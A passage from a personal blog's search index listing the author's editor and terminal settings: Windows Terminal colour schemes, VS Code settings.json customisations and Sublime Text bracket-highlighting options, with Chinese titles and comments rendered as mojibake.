\"#2e3436\", \"red\": \"#cc0000\", \"green\": \"#2fff24\", \"yellow\": \"#c4a000\", \"blue\": \"#3465a4\", \"purple\": \"#75507b\", \"cyan\": \"#06989a\", \"white\": \"#d3d7cf\", \"brightBlack\": \"#555753\", \"brightRed\": \"#ef2929\", \"brightGreen\": \"#8ae234\", \"brightYellow\": \"#fce94f\", \"brightBlue\": \"#729fcf\", \"brightPurple\": \"#ad7fa8\", \"brightCyan\": \"#34e2e2\", \"brightWhite\": \"#eeeeec\", \"background\": \"#300a24\", \"foreground\": \"#eeeeec\" }, { \"name\": \"AdventureTime\", \"black\": \"#050404\", \"red\": \"#bd0013\", \"green\": \"#4ab118\", \"yellow\": \"#e7741e\", \"blue\": \"#0f4ac6\", \"purple\": \"#665993\", \"cyan\": \"#70a598\", \"white\": \"#f8dcc0\", \"brightBlack\": \"#4e7cbf\", \"brightRed\": \"#fc5f5a\", \"brightGreen\": \"#9eff6e\", \"brightYellow\": \"#efc11a\", \"brightBlue\": \"#1997c6\", \"brightPurple\": \"#9b5953\", \"brightCyan\": \"#c8faf4\", \"brightWhite\": \"#f6f5fb\", \"background\": \"#1f1d45\", \"foreground\": \"#f8dcc0\" }], // Add custom actions and keybindings to this array. // To unbind a key combination from your defaults.json, set the command to \"unbound\". // To learn more about actions and keybindings, visit https://aka.ms/terminal-keybindings \"actions\": [ // Copy and paste are bound to Ctrl+Shift+C a","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:2:4","tags":null,"title":"ä¸ªäººé…ç½®","uri":"https://songzhiv.github.io/config/"},{"categories":["å…¶ä»–"],"content":"VS Code { \"files.autoSave\": \"onFocusChange\", \"editor.cursorStyle\": \"block\", \"editor.autoClosingBrackets\": \"never\", \"editor.fontSize\": 16, \"editor.suggestSelection\": \"first\", \"editor.rulers\": [100], \"workbench.colorCustomizations\": { // è¡Œå·æ•°å­—çš„é¢œè‰² \"editorLineNumber.foreground\": \"#17a346\", // å…‰æ ‡çš„é¢œè‰² \"editorCursor.foreground\": \"#138136\", \"editor.selectionBackground\": \"#7c857f\", \"editor.background\": \"#413e3e\", \"activityBar.background\": \"#524f4f\", \"statusBar.background\": \"#524f4f\", \"activityBarBadge.background\": \"#2979FF\", \"activityBar.activeBorder\": \"#2979FF\", \"list.activeSelectionForeground\": \"#2979FF\", \"list.inactiveSelectionForeground\": \"#2979FF\", \"list.highlightForeground\": \"#2979FF\", \"scrollbarSlider.activeBackground\": \"#2979FF50\", \"editorSuggestWidget.highlightForeground\": \"#2979FF\", \"textLink.foreground\": \"#2979FF\", \"progressBar.background\": \"#2979FF\", \"pickerGroup.foreground\": \"#2979FF\", \"tab.activeBorder\": \"#2979FF\", \"notificationLink.foreground\": \"#2979FF\", \"editorWidget.resizeBorder\": \"#2979FF\", \"editorWidget.border\": \"#2979FF\", \"settings.modifiedItemIndicator\": \"#2979FF\", \"settings.headerForeground\": \"#2979FF\", \"panelTitle.activeBorder\": \"#2979FF\", \"breadcrumb.activeSelectionForeground\": \"#2979FF\", \"menu.selectionForeground\": \"#2979FF\", \"menubar.selectionForeground\": \"#2979FF\", \"editor.findMatchBorder\": \"#2979FF\", \"selection.background\": \"#13cc7040\", \"statusBarItem.remoteBackground\": \"#2979FF\" }, \"materialTheme.accent\": \"Blue\", \"terminal.integrated.fontFamily\": \"monaco\", \"editor.fontFamily\": \"Fira Code\", \"editor.fontLigatures\": true, \"editor.cursorBlinking\": \"phase\", \"editor.fontWeight\": \"490\", \"editor.autoClosingQuotes\": \"never\", \"editor.autoSurround\": \"never\", \"editor.renderIndentGuides\": false, \"workbench.tree.renderIndentGuides\": \"none\", \"editor.highlightActiveIndentGuide\": false, \"editor.copyWithSyntaxHighlighting\": false, \"editor.renderLineHighlight\": \"none\", \"workbench.editorAssociations\": { \"*.ipynb\": \"jupyter-notebook\" }, \"workbench.colorTheme\": \"Seti Monokai\", \"workbench.editor.untitled.hint\": \"hidden\", \"workbench.iconTheme\": \"vscode-icons\", \"workbench.startupEditor\": \"none\", \"notebook.cellToolbarLocation\": { \"default\": \"right\", \"jupyter-notebook\": \"left\" }, \"editor.tokenColorCustomizations\": { \"textMateRules\": [ { \"name\": \"Comment\", \"scope\": [ \"comment\", \"comment.block\", \"comment.block.documentation\", \"comment.line\", \"comment.line.double-slash\", \"punctuation.definition.comment\", ], \"settings\": { \"fontStyle\": \"\", //æ–œä½“ \"fontStyle\": \"italic\", //æ–œä½“ä¸‹åˆ’çº¿ \"fontStyle\": \"italic underline\", //æ–œä½“ç²—ä½“ä¸‹åˆ’çº¿ \"fontStyle\": \"italic bold underline\", } }, ] }, \"workbench.settings.editor\": \"json\", } ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:2:5","tags":null,"title":"ä¸ªäººé…ç½®","uri":"https://songzhiv.github.io/config/"},{"categories":["å…¶ä»–"],"content":"Sublimetext3 { \"auto_complete\": true, \"auto_match_enabled\": false, \"color_scheme\": \"Packages/Color Scheme - Default/Monokai.sublime-color-scheme\", \"dictionary\": \"Packages/Language - English/en_GB.dic\", \"font_face\": \"monaco\", \"font_size\": 12, \"ignored_packages\": [ \"Vintage\" ] } bracket: { \"bracket_styles\": { // `default` and `unmatched` styles are special // styles. If they are not defined here, // they will be generated internally with // internal defaults. // `default` style defines attributes that // will be used for any style that does not // explicitly define that attribute. So if // a style does not define a color, it will // use the color from the \"default\" style. \"default\": { \"icon\": \"dot\", // Support the old convention of `brackethighlighter.default` // for themes that already provide something. // As this has always been the only one we've provided // by default, all the others will use region-ish colors. \"color\": \"region.yellowish brackethighlighter.default\", // \"style\": \"underline\" \"style\": \"hightlight\" }, // This particular style is used to highlight // unmatched bracket pairs. It is a special // style. \"unmatched\": { \"icon\": \"question\", \"color\": \"region.redish\", \"style\": \"outline\" }, // User defined region styles \"curly\": { \"icon\": \"curly_bracket\", \"color\": \"region.purplish\", \"style\": \"hightlight\" }, \"round\": { \"icon\": \"round_bracket\", \"color\": \"region.yellowish\", \"style\": \"hightlight\" }, \"square\": { \"icon\": \"square_bracket\", \"color\": \"region.bluish\", \"style\": \"hightlight\" }, //ä¸‹é¢çš„éƒ½æ˜¯åŸæ¥çš„æ ·å¼ \"angle\": { \"icon\": \"angle_bracket\", \"color\": \"region.orangish\" // \"style\": \"underline\" }, \"tag\": { \"icon\": \"tag\", \"color\": \"region.orangish\" // \"style\": \"underline\" }, \"c_define\": { \"icon\": \"hash\", \"color\": \"region.yellowish\" // \"style\": \"underline\" }, \"single_quote\": { \"icon\": \"single_quote\", \"color\": \"region.greenish\" // \"style\": \"underline\" }, \"double_quote\": { \"icon\": \"double_quote\", \"color\": \"region.greenish\" // \"style\": \"underline\" }, \"regex\": { \"icon\": \"star\", \"color\": \"region.greenish\" // \"style\": \"underline\" } } } ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:2:6","tags":null,"title":"ä¸ªäººé…ç½®","uri":"https://songzhiv.github.io/config/"},{"categories":null,"content":"å­¦ä¹ è·¯ä¸Šçš„å°åºŸç‰©ã€‚ åŠåŠå­çš„å®‰æœä»”ã€‚ WXï¼šsubv_nmk ","date":"0001-01-01","objectID":"https://songzhiv.github.io/about/:0:0","tags":null,"title":"","uri":"https://songzhiv.github.io/about/"}]